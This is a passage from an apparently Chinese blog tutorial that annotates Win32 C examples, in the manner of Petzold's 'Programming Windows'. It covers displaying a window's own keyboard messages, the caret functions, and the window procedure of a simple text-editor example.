&#125;</span><br><span class="line">	<span class="comment">// Calculate scrolling rectangle </span></span><br><span class="line">	<span class="comment">//滚动矩形的</span></span><br><span class="line">	rectScroll.left = <span class="number">0</span>;</span><br><span class="line">	rectScroll.right = cxClient;</span><br><span class="line">	rectScroll.top = cyChar;<span class="comment">//滚动矩形起点是第一行,第0行用于打印栏目常量</span></span><br><span class="line">	rectScroll.bottom = cyChar * (cyClient / cyChar);<span class="comment">//滚动矩形的底是客户区最多能容纳的那一行</span></span><br><span class="line">	InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);<span class="comment">//一旦客户区尺寸变化则重绘整个客户区</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="键盘消息">键盘消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">	<span class="comment">//所有的键盘动作,包括击键消息和字符消息还有系统键消息都记录下来</span></span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:<span class="comment">//键盘按下</span></span><br><span class="line"><span class="keyword">case</span> WM_KEYUP:<span class="comment">//键盘起来</span></span><br><span class="line"><span class="keyword">case</span> WM_CHAR:<span class="comment">//字符消息</span></span><br><span class="line"><span class="keyword">case</span> WM_DEADCHAR:<span class="comment">//死字符消息</span></span><br><span class="line"><span class="keyword">case</span> WM_SYSKEYDOWN:<span class="comment">//系统键Alt按下</span></span><br><span class="line"><span class="keyword">case</span> WM_SYSKEYUP:<span class="comment">//系统键起来</span></span><br><span class="line"><span class="keyword">case</span> WM_SYSCHAR:<span class="comment">//系统字符消息</span></span><br><span class="line"><span class="keyword">case</span> WM_SYSDEADCHAR:<span class="comment">//系统死字符消息</span></span><br><span class="line">	<span class="comment">// Rearrange storage array </span></span><br><span class="line">	<span class="keyword">for</span> (i = cLinesMax - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		pmsg[i] = pmsg[i - <span class="number">1</span>];<span class="comment">//新的键盘记录放到pmsg[0],历史消息都顺次后移一个</span></span><br><span class="line">           <span class="comment">//如果消息总数超过了cLinesMax则丢弃早些时候到达的消息,实际上维护了一个队列</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Store new message </span></span><br><span class="line">	pmsg[<span class="number">0</span>].hwnd = hwnd;<span class="comment">//记录最新键盘消息</span></span><br><span class="line">	pmsg[<span class="number">0</span>].message = message;</span><br><span class="line">	pmsg[<span class="number">0</span>].wParam = wParam;</span><br><span class="line">	pmsg[<span class="number">0</span>].lParam = lParam;</span><br><span class="line">	cLines = min(cLines + <span class="number">1</span>, cLinesMax);<span class="comment">//更新 &quot;已使用行数&quot; ,但是最大值不能超过最大行数</span></span><br><span class="line">	<span class="comment">// Scroll up the display </span></span><br><span class="line">	ScrollWindow(hwnd, <span class="number">0</span>, -cyChar, &amp;rectScroll, &amp;rectScroll);<span class="comment">//滚动rectScroll对应区域,实际上整个网上平移cyChar即一行的高度</span></span><br><span class="line">	<span class="keyword">break</span>; <span class="comment">// i.e., call DefWindowProc so Sys messages work</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>"i.e., call DefWindowProc so Sys messages work"翻译成人话:</p>
<p>"也就是说,调用DefWindowProc"处理系统键消息</p>
</blockquote>
<p>最后这里用的是break不是return,意味着只是看看键盘消息是谁而不进行拦截,记录一下接着丢给系统做取舍,保证Alt系统消息能够被正确处理</p>
<h3 id="绘图消息">绘图消息</h3>
<p>前面的一切消息处理都是在给绘图消息的处理做准备</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">	hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">	SelectObject(hdc, GetStockObject(SYSTEM_FIXED_FONT));</span><br><span class="line">	SetBkMode(hdc, TRANSPARENT);</span><br><span class="line">	TextOut(hdc, <span class="number">0</span>, <span class="number">0</span>, szTop, lstrlen(szTop));<span class="comment">//打印最顶上第0行</span></span><br><span class="line">	TextOut(hdc, <span class="number">0</span>, <span class="number">0</span>, szUnd, lstrlen(szUnd));</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; min(cLines, cyClient / cyChar - <span class="number">1</span>); i++)<span class="comment">//一共打印cLines行,但是不能超过客户区总行数</span></span><br><span class="line">	&#123;</span><br><span class="line">		iType = pmsg[i].message == WM_CHAR ||<span class="comment">//如果是字符消息则iType=1否则为0</span></span><br><span class="line">			pmsg[i].message == WM_SYSCHAR ||</span><br><span class="line">			pmsg[i].message == WM_DEADCHAR ||</span><br><span class="line">			pmsg[i].message == WM_SYSDEADCHAR;</span><br><span class="line">		GetKeyNameText(pmsg[i].lParam, szKeyName,</span><br><span class="line">			<span class="keyword">sizeof</span>(szKeyName) / <span class="keyword">sizeof</span>(TCHAR));<span class="comment">//获取表示键名的字符串</span></span><br><span class="line">		TextOut(hdc, <span class="number">0</span>, (cyClient / cyChar - <span class="number">1</span> - i) * cyChar, szBuffer,</span><br><span class="line">			wsprintf(szBuffer, szFormat[iType],<span class="comment">//根据szFormat[iType]格式化字符串进行打印,即区分字符消息和虚拟键消息</span></span><br><span class="line">				szMessage[pmsg[i].message - WM_KEYFIRST],<span class="comment">///如此计算出来正好得到消息类型</span></span><br><span class="line">				pmsg[i].wParam,</span><br><span class="line">				(PTSTR)(iType ? TEXT(<span class="string">&quot; &quot;</span>) : szKeyName),<span class="comment">//如果是字符类型则打印空字符串否则打印键名</span></span><br><span class="line">				(TCHAR)(iType ? pmsg[i].wParam : <span class="string">&#x27; &#x27;</span>),<span class="comment">//如果是字符类型则打印该字符,否则打印空串</span></span><br><span class="line">				LOWORD(pmsg[i].lParam),</span><br><span class="line">				HIWORD(pmsg[i].lParam) &amp; <span class="number">0xFF</span>,</span><br><span class="line">				<span class="number">0x01000000</span> &amp; pmsg[i].lParam ? szYes : szNo,</span><br><span class="line">				<span class="number">0x20000000</span> &amp; pmsg[i].lParam ? szYes : szNo,</span><br><span class="line">				<span class="number">0x40000000</span> &amp; pmsg[i].lParam ? szDown : szUp,</span><br><span class="line">				<span class="number">0x80000000</span> &amp; pmsg[i].lParam ? szUp : szDown));</span><br><span class="line">	&#125;</span><br><span class="line">	EndPaint(hwnd, &amp;ps);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>其中<code>szMessage[pmsg[i].message - WM_KEYFIRST]</code>很巧妙</p>
<p>szMessage在WndProc一开始有定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> TCHAR  szMessage[<span class="number">8</span>][<span class="number">100</span>] = &#123;</span><br><span class="line">	TEXT(<span class="string">&quot;WM_KEYDOWN&quot;</span>), TEXT(<span class="string">&quot;WM_KEYUP&quot;</span>),</span><br><span class="line">	TEXT(<span class="string">&quot;WM_CHAR&quot;</span>), TEXT(<span class="string">&quot;WM_DEADCHAR&quot;</span>),</span><br><span class="line">	TEXT(<span class="string">&quot;WM_SYSKEYDOWN&quot;</span>),TEXT(<span class="string">&quot;WM_SYSKEYUP&quot;</span>),</span><br><span class="line">	TEXT(<span class="string">&quot;WM_SYSCHAR&quot;</span>), TEXT(<span class="string">&quot;WM_SYSDEADCHAR&quot;</span>) </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WM_KEYFIRST                     0x0100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_KEYDOWN                      0x0100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_KEYUP                        0x0101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_CHAR                         0x0102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_DEADCHAR                     0x0103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_SYSKEYDOWN                   0x0104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_SYSKEYUP                     0x0105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_SYSCHAR                      0x0106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_SYSDEADCHAR                  0x0107</span></span><br></pre></td></tr></table></figure>
<p>WM_KEYFIRST表示WM消息的第一个,WM_KEYDOWN-WM_KEYFIRSST=0x100-0x100=0</p>
<p>正好对应szMessage下标为0的的成员TEXT("WM_KEYDOWN")</p>
<h3 id="窗口销毁消息">窗口销毁消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">	PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="插入符号">插入符号</h2>
<p>向文本编辑器中输入文本时,当前输入位置会有一个方格或者竖线或者下划线闪烁,</p>
<p>这个闪烁的玩意儿叫做"插入符号(caret)",而不是"光标(cursor)",光标是指鼠标位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812221958812.png"
alt="windows终端中的插入符号" />
<figcaption aria-hidden="true">windows终端中的插入符号</figcaption>
</figure>
<p>windowsAPI提供了插入符号的现成的函数,</p>
<blockquote>
<p>在此之前我还以为这个闪烁效果得是行尾一个竖线|和空格交替重绘.客户区其他部位一直重绘.显然客户区重新打印一遍太耗时了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CreateCaret 建立与视窗有关的插入符号</span><br><span class="line">SetCaretPos 在视窗中设定插入符号的位置</span><br><span class="line">ShowCaret 显示插入符号</span><br><span class="line">HideCaret 隐藏插入符号</span><br><span class="line">DestroyCaret 撤消插入符号</span><br><span class="line">GetCaretPos 获取当前插入符号位置</span><br><span class="line">GetCaretBlinkTime 获取符号闪烁时间</span><br><span class="line">SetCaretBlinkTime 设置符号闪烁时间</span><br></pre></td></tr></table></figure>
<h3 id="时机">时机</h3>
<p>插入符号的作用就是提示用户当前输入位置,显然这个正在被输入的窗口是焦点窗口</p>
<p>而一个窗口过程可能负责多个窗口的消息处理,那么插入符号的改变应该是窗口特定的,不应是窗口过程特定的</p>
<p>因此最好的处理时机是WM_SETFOCUS和WM_KILLFOCUS消息</p>
<p>在处理WM_SETFOCUS时调用CreateCaret,在处理WM_KILLFOCUS消息时调用DestoryCaret</p>
<p>创建插入符号之后并没有立刻输出到屏幕,需要再挑一个适当的时候调用ShowCaret显示它</p>
<p>在处理WM_PAINT时调用CreateCaret,在处理其他需要绘图的消息时调用HideCaret暂时隐藏插入符号.其他消息处理完成之后再调用CreateCaret重新显示插入符号</p>
<p>HideCaret的效果叠加,假设连续调用了10次HideCaret函数,那么就需要调用ShowCaret函数10次才可以把插入符号拽出来.</p>
<h2 id="baby-notepad">baby notepad</h2>
<p>"弟弟军训完了,非要给我露一手"</p>
<p>书上在这里给出了一个例子,一个婴儿版的文本编辑器</p>
<p>分析一下它的窗口过程WndProc函数</p>
<h3 id="宏定义">宏定义</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER(x,y) *(pBuffer + y * cxBuffer + x)</span></span><br></pre></td></tr></table></figure>
<p>本定义用于取缓冲区的第x行第y列这个字符.</p>
<p>实际上用了一个一维数组模拟二维数组,<code>BUFFER(x,y)</code>相当于<code>buffer[x][y]</code></p>
<h3 id="变量定义-1">变量定义</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> DWORD dwCharSet = DEFAULT_CHARSET;<span class="comment">//字符集标志</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> cxChar, cyChar, cxClient, cyClient, cxBuffer, cyBuffer,</span><br><span class="line">	xCaret, yCaret;</span><br><span class="line"><span class="type">static</span> TCHAR* pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">HDC hdc;</span><br><span class="line"><span class="type">int</span> x, y, i;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">TEXTMETRIC tm;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3
id="字符集变换窗口创建尺寸变化消息">字符集变换,窗口创建,尺寸变化消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">case</span> WM_INPUTLANGCHANGE:</span><br><span class="line">		dwCharSet = wParam;<span class="comment">//字符集,和输入法有关,默认是DEFAULT_CHARSET</span></span><br><span class="line">		<span class="comment">// fall through </span></span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line">		SelectObject(hdc, CreateFont(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">			dwCharSet, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, FIXED_PITCH, <span class="literal">NULL</span>));</span><br><span class="line"><span class="comment">//输入法改变或者窗口创建时都需要重新设置字符集,字符集是字体的一部分</span></span><br><span class="line"></span><br><span class="line">		GetTextMetrics(hdc, &amp;tm);</span><br><span class="line">		cxChar = tm.tmAveCharWidth;<span class="comment">//获取字符宽度</span></span><br><span class="line">		cyChar = tm.tmHeight;<span class="comment">//字符高度</span></span><br><span class="line"></span><br><span class="line">		DeleteObject(SelectObject(hdc, GetStockObject(SYSTEM_FONT)));<span class="comment">//使用系统字体</span></span><br><span class="line">		ReleaseDC(hwnd, hdc);</span><br><span class="line">		<span class="comment">// fall through </span></span><br><span class="line">	<span class="keyword">case</span> WM_SIZE:</span><br><span class="line">		<span class="comment">// obtain window size in pixels </span></span><br><span class="line">		<span class="keyword">if</span> (message == WM_SIZE)</span><br><span class="line">		&#123;</span><br><span class="line">			cxClient = LOWORD(lParam);<span class="comment">//更新客户区尺寸记录</span></span><br><span class="line">			cyClient = HIWORD(lParam);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// calculate window size in characters </span></span><br><span class="line"></span><br><span class="line">		cxBuffer = max(<span class="number">1</span>, cxClient / cxChar);<span class="comment">//横向最多打印cxClient/cxChar列</span></span><br><span class="line">		cyBuffer = max(<span class="number">1</span>, cyClient / cyChar);<span class="comment">//纵向最多打印cyClient/cyChar行</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// allocate memory for buffer and clear it </span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pBuffer != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">free</span>(pBuffer);</span><br><span class="line">		pBuffer = (TCHAR*)<span class="built_in">malloc</span>(cxBuffer * cyBuffer * <span class="keyword">sizeof</span>(TCHAR));<span class="comment">//pBuffer为需要打印到屏幕的缓冲区,其大小按照cxBuffer*cyBuffer分配</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; cyBuffer; y++)</span><br><span class="line">			<span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; cxBuffer; x++)</span><br><span class="line">				BUFFER(x, y) = <span class="string">&#x27; &#x27;</span>;<span class="comment">//初始化buffer全为空格</span></span><br><span class="line">		<span class="comment">// set caret to upper left corner </span></span><br><span class="line">		xCaret = <span class="number">0</span>;<span class="comment">//初始插入字符位置(0,0)</span></span><br><span class="line">		yCaret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hwnd == GetFocus())<span class="comment">//判断当前窗口是否为焦点窗口</span></span><br><span class="line">			SetCaretPos(xCaret * cxChar, yCaret * cyChar);<span class="comment">//如果是已经是焦点窗口了则设置当前插入字符位置</span></span><br><span class="line">		InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);<span class="comment">//重绘整个客户区</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="获取焦点消息">获取焦点消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SETFOCUS:</span><br><span class="line">	<span class="comment">// create and show the caret </span></span><br><span class="line">	CreateCaret(hwnd, <span class="literal">NULL</span>, cxChar, cyChar);<span class="comment">//当前窗口获取焦点,此时创建插入字符</span></span><br><span class="line">	SetCaretPos(xCaret * cxChar, yCaret * cyChar);<span class="comment">//设置好插入字符的位置,这个位置可以通过方向键等改变</span></span><br><span class="line">	ShowCaret(hwnd);<span class="comment">//显示插入字符</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="失去焦点消息">失去焦点消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KILLFOCUS:</span><br><span class="line">	<span class="comment">// hide and destroy the caret </span></span><br><span class="line">	HideCaret(hwnd);<span class="comment">//失去焦点,隐藏插入符号</span></span><br><span class="line">	DestroyCaret();<span class="comment">//删除插入符号</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="键盘消息-1">键盘消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">	<span class="keyword">switch</span> (wParam)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> VK_HOME:<span class="comment">//各种移动插入符号位置</span></span><br><span class="line">		xCaret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> VK_END:</span><br><span class="line">		xCaret = cxBuffer - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> VK_PRIOR:</span><br><span class="line">		yCaret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> VK_NEXT:</span><br><span class="line">		yCaret = cyBuffer - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> VK_LEFT:</span><br><span class="line">		xCaret = max(xCaret - <span class="number">1</span>, <span class="number">0</span>);<span class="comment">//最左不能移出客户区</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> VK_RIGHT:</span><br><span class="line">		xCaret = min(xCaret + <span class="number">1</span>, cxBuffer - <span class="number">1</span>);<span class="comment">//最右不能移出客户区</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> VK_UP:</span><br><span class="line">		yCaret = max(yCaret - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> VK_DOWN:</span><br><span class="line">		yCaret = min(yCaret + <span class="number">1</span>, cyBuffer - <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> VK_DELETE:<span class="comment">//退格键</span></span><br><span class="line">		<span class="keyword">for</span> (x = xCaret; x &lt; cxBuffer - <span class="number">1</span>; x++)<span class="comment">//退格键的作用是当前行当前位置之后的所有字符前移一个字符的宽度,删除当前字符</span></span><br><span class="line">			BUFFER(x, yCaret) = BUFFER(x + <span class="number">1</span>, yCaret);</span><br><span class="line"></span><br><span class="line">		BUFFER(cxBuffer - <span class="number">1</span>, yCaret) = <span class="string">&#x27; &#x27;</span>;<span class="comment">//退格前本行最后一个字符置空格</span></span><br><span class="line"></span><br><span class="line">		HideCaret(hwnd);<span class="comment">//临时隐藏插入字符,必须的操作,否则插入字符后面会拖着个黑框</span></span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line"></span><br><span class="line">		SelectObject(hdc, CreateFont(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">			dwCharSet, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, FIXED_PITCH, <span class="literal">NULL</span>));</span><br><span class="line">		TextOut(hdc, xCaret * cxChar, yCaret * cyChar,</span><br><span class="line">			&amp;BUFFER(xCaret, yCaret),</span><br><span class="line">			cxBuffer - xCaret);<span class="comment">//重新打印该行</span></span><br><span class="line">		DeleteObject(SelectObject(hdc, GetStockObject</span><br><span class="line">		(SYSTEM_FONT)));<span class="comment">//这句话写不写无所谓</span></span><br><span class="line">		ReleaseDC(hwnd, hdc);</span><br><span class="line">		ShowCaret(hwnd);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	SetCaretPos(xCaret * cxChar, yCaret * cyChar);<span class="comment">//设置插入字符的位置</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="字符消息-1">字符消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CHAR:</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)LOWORD(lParam); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">switch</span> (wParam)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;\b&#x27;</span>: <span class="comment">// backspace </span></span><br><span class="line">			<span class="keyword">if</span> (xCaret &gt; <span class="number">0</span>)<span class="comment">//退格最多退到本行开始</span></span><br><span class="line">			&#123;</span><br><span class="line">				xCaret--;<span class="comment">//插入符号的位置左移</span></span><br><span class="line">				SendMessage(hwnd, WM_KEYDOWN, VK_DELETE,</span><br><span class="line">					<span class="number">1</span>);<span class="comment">//发生退格的时候要删除字符</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;\t&#x27;</span>: <span class="comment">// tab </span></span><br><span class="line">			<span class="keyword">do</span></span><br><span class="line">			&#123;</span><br><span class="line">				SendMessage(hwnd, WM_CHAR, <span class="string">&#x27; &#x27;</span>, <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">while</span> (xCaret % <span class="number">8</span> != <span class="number">0</span>);<span class="comment">//右移直到xCaret位置8字符对齐</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>: <span class="comment">// line feed </span></span><br><span class="line">			<span class="keyword">if</span> (++yCaret == cyBuffer)<span class="comment">//回车后需要跳到下一行相同x位置</span></span><br><span class="line">				yCaret = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;\r&#x27;</span>: <span class="comment">// carriage return </span></span><br><span class="line">			xCaret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (++yCaret == cyBuffer)</span><br><span class="line">				yCaret = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span 